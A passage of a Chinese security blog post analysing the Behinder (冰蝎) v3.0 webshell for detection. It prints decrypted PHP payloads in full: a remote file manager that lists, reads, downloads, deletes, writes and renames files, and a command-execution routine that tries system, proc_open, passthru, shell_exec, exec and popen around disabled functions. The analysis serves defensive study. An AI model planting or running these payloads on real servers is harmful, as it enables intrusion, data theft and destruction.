&quot;UTF-8&quot;, $charset));</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if ($charset==&quot;&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $result[&quot;msg&quot;] = base64_encode(getSafeStr($contents));</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                    $result[&quot;msg&quot;] = base64_encode(iconv($charset, &apos;utf-8//IGNORE&apos;, $contents));</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            $result = encrypt(json_encode($result),$_SESSION[&apos;k&apos;]);</span><br><span class="line">            echo $result;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;download&quot;:</span><br><span class="line">            if (! file_exists($path)) &#123;</span><br><span class="line">                header(&apos;HTTP/1.1 404 NOT FOUND&apos;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $file = fopen($path, &quot;rb&quot;);</span><br><span class="line">                echo fread($file, filesize($path));</span><br><span class="line">                fclose($file);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line">        case &quot;delete&quot;:</span><br><span class="line">            if (is_file($path)) &#123;</span><br><span class="line">                if (unlink($path)) &#123;</span><br><span class="line">                    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">                    $result[&quot;msg&quot;] = base64_encode($path . &quot;删除成功&quot;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">                    $result[&quot;msg&quot;] = base64_encode($path . &quot;删除失败&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            if (is_dir($path)) &#123;</span><br><span class="line">                delDir($path);</span><br><span class="line">                $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode($path.&quot;删除成功&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            echo encrypt(json_encode($result),$_SESSION[&apos;k&apos;]);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;create&quot;:</span><br><span class="line">            $file = fopen($path, &quot;w&quot;);</span><br><span class="line">            $content = base64_decode($content);</span><br><span class="line">            fwrite($file, $content);</span><br><span class="line">            fflush($file);</span><br><span class="line">            fclose($file);</span><br><span class="line">            if (file_exists($path) &amp;&amp; filesize($path) == strlen($content)) &#123;</span><br><span class="line">                $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode($path . &quot;上传完成，远程文件大尿:&quot; . $path . filesize($path));</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode($path . &quot;上传失败&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;append&quot;:</span><br><span class="line">            $file = fopen($path, &quot;a+&quot;);</span><br><span class="line">            $content = base64_decode($content);</span><br><span class="line">            fwrite($file, $content);</span><br><span class="line">            fclose($file);</span><br><span class="line">            $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">            $result[&quot;msg&quot;] = base64_encode($path . &quot;追加完成，远程文件大尿:&quot; . $path . filesize($path));</span><br><span class="line">            echo encrypt(json_encode($result),$_SESSION[&apos;k&apos;]);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;rename&quot;:</span><br><span class="line">            if (rename($path,$newpath)) &#123;</span><br><span class="line">                $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode(&quot;重命名完房:&quot; . $newpath);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode($path . &quot;重命名失贿&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]);</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$mode=&quot;list&quot;;$path=&quot;\var\www\html\Behinder_v3.0/&quot;;</span><br><span class="line">main($mode,$path);</span><br></pre></td></tr></table></figure>
+
+<p>最后这两次代码是列出当前路径的文件</p>
+<p>可以看到这个代码有以下功能：<br>1、列目录<br>2、获取文件内容<br>3、下载文件<br>4、删除文件<br>5、写入文件<br>6、向文件追加内容<br>7、重命名文件</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>以id命令为例，可以看到跟v2.0是一样的，尝试用各种php执行命令的函数执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&apos;max_execution_time&apos;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&apos;disable_functions&apos;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&apos;trim&apos;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &apos;is_callable&apos;;</span><br><span class="line">    $Bvce = &apos;in_array&apos;;</span><br><span class="line">    if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;r&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &apos;r&apos;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&apos;k&apos;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&apos;k&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$cmd=&quot;id&quot;;</span><br><span class="line">main($cmd);</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/" title="冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测">https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/webshell/" rel="tag"># webshell</a>
+          
+            <a href="/tags/冰蝎/" rel="tag"># 冰蝎</a>
+          
+            <a href="/tags/Behinder/" rel="tag"># Behinder</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/24/一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)/" rel="next" title="一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)">
+                <i class="fa fa-chevron-left"></i> 一个2016年afl的议题记录：BSidesSF 2016 - Fuzz Smarter, Not Harder (An afl-fuzz Primer) (Craig Young)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/08/18/哥斯拉Godzilla PHP Webshell分析与检测特征提取/" rel="prev" title="哥斯拉Godzilla PHP Webshell分析与检测特征提取">
+                哥斯拉Godzilla PHP Webshell分析与检测特征提取 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验环境"><span class="nav-number">1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#以shell-php为例的Webshell文件分析"><span class="nav-number">2.</span> <span class="nav-text">以shell.php为例的Webshell文件分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#流量分析"><span class="nav-number">3.</span> <span class="nav-text">流量分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码流程分析"><span class="nav-number">4.</span> <span class="nav-text">代码流程分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#首次连接"><span class="nav-number">4.1.</span> <span class="nav-text">首次连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">4.2.</span> <span class="nav-text">命令执行</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/';
+          this.page.identifier = '2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/';
+          this.page.title = '冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
